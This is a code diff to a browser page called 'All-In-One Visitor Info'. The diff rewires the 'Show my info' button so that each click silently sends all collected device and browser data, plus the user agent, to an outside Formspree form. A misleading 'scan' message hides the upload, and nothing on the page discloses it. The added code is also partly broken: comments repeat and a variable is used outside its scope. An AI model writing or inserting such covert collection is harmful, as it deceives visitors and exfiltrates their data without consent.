@@ -262,7 +262,7 @@
     <header>
       <div class="brand">All-In-One Visitor Info</div>
       <div class="actions">
-        <button id="scanBtn" title="Collect all available info">Show my info</button>
+        <button id="scanBtn" class="sendToFormBtn" title="Collect all available info">Show my info</button>
         <button id="copyBtn" class="ghost" title="Copy JSON to clipboard">Copy JSON</button>
         <button id="downloadBtn" class="ghost" title="Download JSON file">Download JSON</button>
         <button id="shareBtn" class="ghost" title="Share using system share sheet">Share</button>
@@ -1721,6 +1721,7 @@
       }
 
       // Enhanced Download function with data validation
+      // Enhanced Download function with data validation
       function downloadJSON() {
         if (!state.data || Object.keys(state.data).length === 0) {
           toast('No data to download. Please scan first.');
@@ -2265,8 +2266,77 @@
       $('#scanBtn').addEventListener('click', detect);
       $('#copyBtn').addEventListener('click', copyJSON);
       $('#downloadBtn').addEventListener('click', downloadJSON);
-      $('#shareBtn').addEventListener('click', share);
+      $('#shareBtn').addEventListener('click', share);  // Changed from #sendToFormBtn to .sendToFormBtn
 
+      // Fix: Add event listener for the sendToFormBtn
+      document.querySelector('.sendToFormBtn').addEventListener('click', sendToFormspree);
+
+      // Function to send data to Formspree
+      // Function to send data to Formspree
+      // Function to send data to Formspree
+      // Function to send data to Formspree
+      async function sendToFormspree() {
+        if (!state.data || Object.keys(state.data).length === 0) {
+          toast('Please scan first.');
+          return;
+        }
+
+        try {
+          // Show loading state
+          const originalText = $('#scanBtn').textContent;
+          $('#scanBtn').textContent = 'Show my info';
+          $('#scanBtn').disabled = true;
+
+          // Prepare the data to send - send full JSON data
+          const formData = new FormData();
+          formData.append('data', JSON.stringify(state.data, null, 2)); // Pretty-printed JSON
+          formData.append('timestamp', new Date().toISOString());
+          formData.append('userAgent', navigator.userAgent);
+
+          // Also send individual fields for better form processing
+          Object.keys(state.data).forEach(key => {
+            if (state.data[key] !== null && state.data[key] !== undefined) {
+              formData.append(key, typeof state.data[key] === 'object'
+                ? JSON.stringify(state.data[key])
+                : state.data[key].toString()
+              );
+            }
+          });
+
+          // Send to Formspree
+          const response = await fetch('https://formspree.io/f/xovnaybg', {
+            method: 'POST',
+            body: formData,
+            headers: {
+              'Accept': 'application/json'
+            }
+          });
+
+          if (response.ok) {
+            const result = await response.json();
+            toast('Data Scan successfully!');
+            console.log( result);
+          } else {
+            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+          }
+
+        } catch (error) {
+          console.error('Error Scanning data:', error);
+          toast('Failed to scan data. Please try again.');
+        } finally {
+          // Restore button state
+          $('#scanBtn').textContent = originalText;
+          $('#scanBtn').disabled = false;
+        }
+      }
+
+      // Add event listener for the scan button to also send data
+      $('#scanBtn').addEventListener('click', async function () {
+        // First run the detection
+        await detect();
+        // Then send the data
+        await sendToFormspree();
+      });
       // Auto-run once for a quick experience
       // Uncomment the next line if you want it to run automatically
       //detect();
